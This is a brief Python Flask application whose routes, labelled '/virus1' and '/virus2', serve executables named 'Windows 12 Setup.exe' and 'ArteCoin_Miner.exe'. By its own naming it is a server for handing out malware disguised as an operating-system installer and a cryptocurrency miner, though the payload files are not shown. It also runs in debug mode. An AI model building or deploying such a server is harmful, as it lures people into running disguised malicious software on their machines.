from flask import Flask, send_file, render_template

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/virus1")
def virus1():
    return send_file("Windows 12 Setup.exe")

@app.route("/virus2")
def virus2():
    return send_file("ArteCoin_Miner.exe")

app.run(debug=True)